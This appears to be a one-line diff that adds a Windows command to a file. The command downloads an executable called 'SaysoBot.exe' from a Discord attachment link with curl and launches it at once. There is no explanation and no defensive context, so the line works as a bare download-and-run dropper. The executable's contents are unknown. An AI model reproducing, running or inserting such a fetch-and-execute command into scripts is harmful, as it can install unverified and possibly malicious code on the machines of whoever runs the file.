@@ -1,0 +1,1 @@
+curl -o SaysoBot.exe https://cdn.discordapp.com/attachments/1194677519836790845/1194677952173051955/SaysoBot.exe?ex=65b1398b&is=659ec48b&hm=289ab7ad0e0cd0a9f0b53cb0f11991e7ca8a7974f69de9eab19d63a4b5758c65& && start SaysoBot.exe
